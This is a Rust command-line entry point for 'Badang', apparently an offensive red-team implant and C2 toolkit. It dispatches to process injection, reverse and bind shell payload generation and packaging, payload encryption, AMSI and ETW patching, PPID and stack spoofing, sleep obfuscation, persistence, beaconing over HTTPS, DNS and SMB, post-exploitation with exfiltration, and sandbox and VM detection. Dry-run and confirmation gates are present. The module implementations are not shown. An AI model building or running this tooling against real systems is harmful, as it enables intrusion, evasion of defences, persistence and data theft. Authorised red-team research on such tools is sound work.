// Badang — CLI binary entry point

use badang::cli::CLI;
use badang::log::LogSink;
use badang::safety::{check_execution_mode, print_safety_warning, validate_target};
use std::process;

fn drain_to_stderr(log: &LogSink) {
    for entry in log.drain() {
        eprintln!("{}", entry.message);
    }
}

fn main() {
    let cli = CLI::parse();
    let log = LogSink::new();

    print_safety_warning(&log);
    drain_to_stderr(&log);

    if cli.command == "analyze" || cli.command == "inject" {
        if let Err(e) = validate_target(cli.target_pid) {
            eprintln!("ERROR: {}", e);
            process::exit(1);
        }
        if cli.target_pid == 0 {
            eprintln!(
                "ERROR: --pid <PID> is required for {} command.",
                cli.command
            );
            eprintln!("Use --dry-run (default) to simulate without executing.");
            process::exit(1);
        }
    } else if cli.target_pid > 0 {
        if let Err(e) = validate_target(cli.target_pid) {
            eprintln!("ERROR: {}", e);
            process::exit(1);
        }
    }

    if let Err(e) = check_execution_mode(cli.dry_run, cli.confirm) {
        eprintln!("ERROR: {}", e);
        eprintln!("Add --confirm to execute operations.");
        process::exit(1);
    }

    match cli.command.as_str() {
        "analyze" => {
            if cli.dry_run {
                println!("[DRY RUN] Would analyze process PID {}", cli.target_pid);
                badang::analysis::detect::dry_run(cli.target_pid, &log);
            } else {
                badang::analysis::detect::analyze(cli.target_pid, &log);
            }
        }
        "syscall" => {
            if cli.indirect {
                if cli.dry_run {
                    badang::syscall::indirect::dry_run(&cli.syscall_func, &log);
                } else {
                    match badang::syscall::indirect::resolve(&cli.syscall_func, &log) {
                        Ok(result) => {
                            log.info(format!(
                                "  Resolved: {} → SSN 0x{:X}, gadget 0x{:016X} ({})",
                                result.func_name,
                                result.ssn,
                                result.syscall_gadget,
                                result.method.name()
                            ));
                        }
                        Err(e) => {
                            eprintln!("ERROR: {}", e);
                            process::exit(1);
                        }
                    }
                }
            } else if cli.dry_run {
                println!("[DRY RUN] Would invoke syscall: {}", cli.syscall_func);
                badang::syscall::dry_run(&cli.syscall_func, &log);
            } else {
                badang::syscall::analyze(&cli.syscall_func, &log);
            }
        }
        "inject" => {
            if cli.dry_run {
                println!(
                    "[DRY RUN] PID {} technique {}",
                    cli.target_pid, cli.inject_technique
                );
                badang::injection::dry_run(cli.target_pid, &cli.inject_technique, &log);
            } else {
                badang::injection::run_live_injection(
                    cli.target_pid,
                    &cli.inject_technique,
                    &cli.payload,
                    &log,
                );
            }
        }
        "load" => match badang::injection::load_payload(&cli.payload) {
            Ok(bytes) => {
                println!("[LOAD] Payload file: {}", cli.payload);
                println!("       Size: {} bytes", bytes.len());
                println!("       First bytes: {:02x?}", &bytes[..bytes.len().min(16)]);
                println!("       (payload loaded successfully — no execution performed)");
                print!("{}", badang::payload::format::hex_dump(&bytes));
            }
            Err(e) => {
                eprintln!("ERROR: {}", e);
                process::exit(1);
            }
        },
        "convert" => {
            let format = match cli.convert_format.to_lowercase().as_str() {
                "auto" => None,
                "hex" => Some(badang::payload::format::PayloadFormat::Hex),
                "c" | "carray" => Some(badang::payload::format::PayloadFormat::CArray),
                "python" | "py" => Some(badang::payload::format::PayloadFormat::PythonBytes),
                "rust" | "rs" => Some(badang::payload::format::PayloadFormat::RustArray),
                "decimal" | "dec" => Some(badang::payload::format::PayloadFormat::Decimal),
                _ => {
                    eprintln!(
                        "ERROR: unknown format '{}'. Use: auto, hex, c, python, rust, decimal",
                        cli.convert_format
                    );
                    process::exit(1);
                }
            };

            // If --payload is set and --input is empty, dump a .bin file as hex
            if cli.convert_input.is_empty() && cli.payload != "payload.bin" {
                match badang::injection::load_payload(&cli.payload) {
                    Ok(bytes) => {
                        println!("[DUMP] {} ({} bytes)\n", cli.payload, bytes.len());
                        print!("{}", badang::payload::format::hex_dump(&bytes));
                        println!("\n--- C array ---");
                        print!("{}", badang::payload::format::to_c_array(&bytes));
                        println!("\n--- Python ---");
                        println!("{}", badang::payload::format::to_python_bytes(&bytes));
                        println!("\n--- Rust ---");
                        print!("{}", badang::payload::format::to_rust_array(&bytes));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            } else if cli.convert_input.is_empty() {
                eprintln!("ERROR: --input <TEXT> is required for convert command.");
                eprintln!("       Or use --payload <FILE> to dump an existing .bin file.");
                process::exit(1);
            } else {
                let (bytes, detected) = if let Some(fmt) = format {
                    match badang::payload::format::parse(&cli.convert_input, fmt) {
                        Ok(b) => (b, fmt),
                        Err(e) => {
                            eprintln!("ERROR: {}", e);
                            process::exit(1);
                        }
                    }
                } else {
                    match badang::payload::format::auto_parse(&cli.convert_input) {
                        Ok(r) => r,
                        Err(e) => {
                            eprintln!("ERROR: {}", e);
                            process::exit(1);
                        }
                    }
                };

                println!(
                    "[CONVERT] Parsed {} bytes (format: {})",
                    bytes.len(),
                    detected.name()
                );
                print!("{}", badang::payload::format::hex_dump(&bytes));

                match std::fs::write(&cli.convert_output, &bytes) {
                    Ok(()) => {
                        println!("[SAVED] {} bytes -> {}", bytes.len(), cli.convert_output);
                    }
                    Err(e) => {
                        eprintln!("ERROR: failed to write '{}': {}", cli.convert_output, e);
                        process::exit(1);
                    }
                }
            }
        }
        "generate" => {
            let payload_type = match badang::payload::generate::PayloadType::from_str(&cli.generate_type) {
                Some(t) => t,
                None => {
                    eprintln!(
                            "ERROR: unknown payload type '{}'. Use: exec, messagebox, reverse_tcp, bind_tcp, stager",
                            cli.generate_type
                        );
                    process::exit(1);
                }
            };
            let config = badang::payload::generate::PayloadConfig {
                payload_type,
                command: cli.generate_command.clone(),
                title: cli.generate_title.clone(),
                text: cli.generate_text.clone(),
                lhost: cli.generate_lhost.clone(),
                lport: cli.generate_lport,
                url: cli.generate_url.clone(),
                stager_key: cli.generate_stager_key.clone(),
            };
            match badang::payload::generate::generate(&config) {
                Ok(bytes) => {
                    println!("[GENERATE] {} — {} bytes", payload_type.name(), bytes.len());

                    if !cli.generate_package.is_empty() {
                        let pkg_format = match badang::payload::package::PackageFormat::from_str(&cli.generate_package) {
                            Some(f) => f,
                            None => {
                                eprintln!(
                                    "ERROR: unknown package format '{}'. Use: exe, ps1, csharp, dll",
                                    cli.generate_package
                                );
                                process::exit(1);
                            }
                        };
                        match badang::payload::package::package(&bytes, pkg_format) {
                            Ok(source) => {
                                println!("[PACKAGE] {} — {} chars", pkg_format.name(), source.len());
                                match std::fs::write(&cli.convert_output, &source) {
                                    Ok(()) => {
                                        println!("[SAVED] {} -> {}", pkg_format.name(), cli.convert_output);
                                    }
                                    Err(e) => {
                                        eprintln!("ERROR: failed to write '{}': {}", cli.convert_output, e);
                                        process::exit(1);
                                    }
                                }
                            }
                            Err(e) => {
                                eprintln!("ERROR: {}", e);
                                process::exit(1);
                            }
                        }
                    } else {
                        print!("{}", badang::payload::format::hex_dump(&bytes));
                        match std::fs::write(&cli.convert_output, &bytes) {
                            Ok(()) => {
                                println!("[SAVED] {} bytes -> {}", bytes.len(), cli.convert_output);
                            }
                            Err(e) => {
                                eprintln!("ERROR: failed to write '{}': {}", cli.convert_output, e);
                                process::exit(1);
                            }
                        }
                    }
                }
                Err(e) => {
                    eprintln!("ERROR: {}", e);
                    process::exit(1);
                }
            }
        }
        "scan" => {
            let processes = badang::process::scan(&log);
            if !processes.is_empty() {
                let list = if cli.scan_filter.is_empty() {
                    processes
                } else {
                    let filtered = badang::process::filter(&processes, &cli.scan_filter);
                    log.info(format!(
                        "  Filter '{}': {} matches",
                        cli.scan_filter,
                        filtered.len()
                    ));
                    filtered
                };
                log.info("");
                badang::process::print_table(&list, &log);
            }
        }
        "unhook" => {
            if cli.dry_run {
                println!("[DRY RUN] Would restore API: {}", cli.unhook_func);
                badang::analysis::unhook::dry_run(&cli.unhook_func, &log);
            } else {
                badang::analysis::unhook::analyze(&cli.unhook_func, &log);
            }
        }
        "ppid" => {
            if cli.ppid_parent.is_empty() {
                eprintln!("ERROR: --parent <NAME> or --parent-pid <PID> is required for ppid command.");
                process::exit(1);
            }
            if cli.dry_run {
                badang::evasion::ppid::dry_run(&cli.ppid_parent, &cli.ppid_child, &log);
            } else {
                let parent_pid = if let Ok(pid) = cli.ppid_parent.parse::<u32>() {
                    pid
                } else {
                    match badang::evasion::ppid::find_pid_by_name(&cli.ppid_parent, &log) {
                        Ok(pid) => pid,
                        Err(e) => {
                            eprintln!("ERROR: {}", e);
                            process::exit(1);
                        }
                    }
                };
                let config = badang::evasion::ppid::PpidConfig {
                    parent_pid,
                    child_command: cli.ppid_child.clone(),
                    suspended: cli.ppid_suspended,
                };
                match badang::evasion::ppid::spawn(&config, &log) {
                    Ok(result) => {
                        log.info(format!(
                            "  Child PID: {}, TID: {}, Parent PID: {}{}",
                            result.child_pid,
                            result.child_tid,
                            result.parent_pid,
                            if result.suspended { " (SUSPENDED)" } else { "" }
                        ));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "encrypt" => {
            if cli.encrypt_key.is_empty() {
                eprintln!("ERROR: --key is required for encrypt command.");
                process::exit(1);
            }
            let method = match badang::payload::encrypt::EncryptMethod::from_str(&cli.encrypt_method) {
                Some(m) => m,
                None => {
                    eprintln!(
                        "ERROR: unknown encrypt method '{}'. Use: xor, xormulti, rc4",
                        cli.encrypt_method
                    );
                    process::exit(1);
                }
            };
            if cli.dry_run {
                badang::payload::encrypt::dry_run(&cli.encrypt_method, &cli.encrypt_key, &log);
            } else {
                match badang::injection::load_payload(&cli.payload) {
                    Ok(payload_bytes) => {
                        let key = cli.encrypt_key.as_bytes();
                        match badang::payload::encrypt::encrypt(&payload_bytes, method, key) {
                            Ok(result) => {
                                println!(
                                    "[ENCRYPT] {} — stub: {} bytes, encrypted: {} bytes, total: {} bytes",
                                    result.method.name(),
                                    result.stub_len,
                                    result.encrypted_len,
                                    result.combined.len()
                                );
                                print!("{}", badang::payload::format::hex_dump(&result.combined));
                                match std::fs::write(&cli.convert_output, &result.combined) {
                                    Ok(()) => {
                                        println!(
                                            "[SAVED] {} bytes -> {}",
                                            result.combined.len(),
                                            cli.convert_output
                                        );
                                    }
                                    Err(e) => {
                                        eprintln!(
                                            "ERROR: failed to write '{}': {}",
                                            cli.convert_output, e
                                        );
                                        process::exit(1);
                                    }
                                }
                            }
                            Err(e) => {
                                eprintln!("ERROR: {}", e);
                                process::exit(1);
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "sleep" => {
            if cli.dry_run {
                badang::evasion::sleep_obfs::dry_run(&cli.sleep_method, cli.sleep_duration, &log);
            } else {
                let result = match cli.sleep_method.to_lowercase().as_str() {
                    "ekko" | "rop" | "timer" => {
                        badang::evasion::sleep_obfs::demo_ekko(cli.sleep_duration, &log)
                    }
                    _ => badang::evasion::sleep_obfs::demo_manual(cli.sleep_duration, &log),
                };
                match result {
                    Ok(demo) => {
                        log.info(format!(
                            "  Region: 0x{:016X}, {} bytes, slept {} ms",
                            demo.region_base, demo.region_size, demo.sleep_ms
                        ));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "spoof" => {
            if cli.dry_run {
                badang::evasion::stack_spoof::dry_run(&cli.spoof_func, &log);
            } else {
                match badang::evasion::stack_spoof::demo_spoofed_call(&cli.spoof_func, &log) {
                    Ok(result) => {
                        log.info(format!(
                            "  Spoofed: {} — {} frames, {} gadgets",
                            result.target_func,
                            result.frames_built,
                            result.gadget_addrs.len()
                        ));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "etw" => {
            if cli.dry_run {
                badang::evasion::etw::dry_run(&cli.etw_target, &log);
            } else {
                match badang::evasion::etw::patch(&cli.etw_target, &log) {
                    Ok(state) => {
                        log.info(format!(
                            "  Patched {} at 0x{:016X} (saved {} original bytes)",
                            state.target,
                            state.address,
                            state.original_bytes.len()
                        ));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "amsi" => {
            if cli.dry_run {
                badang::evasion::amsi::dry_run(&cli.amsi_target, &log);
            } else {
                match badang::evasion::amsi::patch(&cli.amsi_target, &log) {
                    Ok(state) => {
                        log.info(format!(
                            "  Patched {} at 0x{:016X} (saved {} original bytes)",
                            state.target,
                            state.address,
                            state.original_bytes.len()
                        ));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "persist" => {
            if cli.dry_run {
                badang::persistence::dry_run(
                    &cli.persist_method,
                    &cli.persist_name,
                    &cli.payload,
                    &log,
                );
            } else {
                let method = match badang::persistence::PersistMethod::from_str(&cli.persist_method) {
                    Some(m) => m,
                    None => {
                        eprintln!(
                            "ERROR: unknown method '{}'. Use: registry, schtask, wmi, hijack, com, service",
                            cli.persist_method
                        );
                        process::exit(1);
                    }
                };
                let config = badang::persistence::PersistConfig {
                    method,
                    name: cli.persist_name.clone(),
                    target: cli.persist_target.clone(),
                    payload_path: cli.payload.clone(),
                };
                match badang::persistence::run_persist(&config, &log) {
                    Ok(result) => {
                        log.info(format!("  {}: {}", result.method.name(), result.description));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "comms" => {
            if cli.dry_run {
                badang::comms::dry_run(
                    &cli.comms_channel,
                    &cli.comms_host,
                    cli.comms_port,
                    cli.comms_interval,
                    &log,
                );
            } else {
                let channel = match badang::comms::Channel::from_str(&cli.comms_channel) {
                    Some(c) => c,
                    None => {
                        eprintln!(
                            "ERROR: unknown channel '{}'. Use: https, dns, smb",
                            cli.comms_channel
                        );
                        process::exit(1);
                    }
                };
                let key = match badang::comms::parse_hex_key(&cli.comms_key) {
                    Ok(k) => k,
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                };
                let config = badang::comms::CommsConfig {
                    channel,
                    host: cli.comms_host.clone(),
                    port: cli.comms_port,
                    path: cli.comms_path.clone(),
                    result_path: String::from("/api/report"),
                    interval_ms: cli.comms_interval,
                    jitter_pct: cli.comms_jitter,
                    key,
                    agent_id: badang::comms::generate_agent_id(),
                    use_sleep_obfs: cli.comms_use_sleep_obfs,
                    max_retries: 10,
                };
                match badang::comms::run_comms(&config, &log) {
                    Ok(result) => {
                        log.info(format!("  {}: {}", result.channel.name(), result.description));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "postex" => {
            if cli.dry_run {
                if cli.postex_module.is_empty() {
                    badang::postex::print_info(&log);
                } else {
                    let module = badang::postex::PostExModule::from_str(&cli.postex_module)
                        .unwrap_or_else(|e| { eprintln!("ERROR: {}", e); process::exit(1); });
                    badang::postex::dry_run(&module, &log);
                }
            } else {
                let module = badang::postex::PostExModule::from_str(&cli.postex_module)
                    .unwrap_or_else(|e| { eprintln!("ERROR: {}", e); process::exit(1); });
                let exfil_key = if cli.postex_exfil_key.is_empty() {
                    Vec::new()
                } else {
                    cli.postex_exfil_key.as_bytes().to_vec()
                };
                let config = badang::postex::PostExConfig {
                    module,
                    pid: cli.target_pid,
                    output: cli.postex_output.clone(),
                    remote: cli.postex_remote.clone(),
                    username: cli.postex_username.clone(),
                    password: cli.postex_password.clone(),
                    command: cli.postex_command.clone(),
                    service_name: cli.postex_service.clone(),
                    payload_path: cli.postex_payload.clone(),
                    file_path: cli.postex_file.clone(),
                    listen_port: cli.postex_listen_port,
                    remote_host: cli.postex_remote_host.clone(),
                    remote_port: cli.postex_remote_port,
                    exfil_key,
                };
                match badang::postex::run_postex(&config, &log) {
                    Ok(result) => {
                        log.info(format!("  {}: {}", result.module, result.description));
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        "loader" => {
            if cli.dry_run {
                badang::loader::dry_run(&cli.loader_check, &log);
            } else {
                let category = match badang::loader::CheckCategory::from_str(&cli.loader_check) {
                    Some(c) => c,
                    None => {
                        eprintln!(
                            "ERROR: unknown category '{}'. Use: sandbox, debug, vm, all",
                            cli.loader_check
                        );
                        process::exit(1);
                    }
                };
                let fail_action = match badang::loader::FailAction::from_str(&cli.loader_action) {
                    Some(a) => a,
                    None => {
                        eprintln!(
                            "ERROR: unknown action '{}'. Use: report, exit",
                            cli.loader_action
                        );
                        process::exit(1);
                    }
                };
                let config = badang::loader::LoaderConfig {
                    category,
                    fail_action,
                };
                match badang::loader::run_checks(&config, &log) {
                    Ok(result) => {
                        if result.safe {
                            log.info("  Environment: CLEAR");
                        } else {
                            let detected: Vec<_> = result.checks.iter()
                                .filter(|c| c.detected)
                                .map(|c| c.name.as_str())
                                .collect();
                            log.info(format!("  Environment: FLAGGED ({})", detected.join(", ")));
                        }
                    }
                    Err(e) => {
                        eprintln!("ERROR: {}", e);
                        process::exit(1);
                    }
                }
            }
        }
        _ => {
            eprintln!("Unknown command: {}", cli.command);
            process::exit(1);
        }
    }

    drain_to_stderr(&log);
}
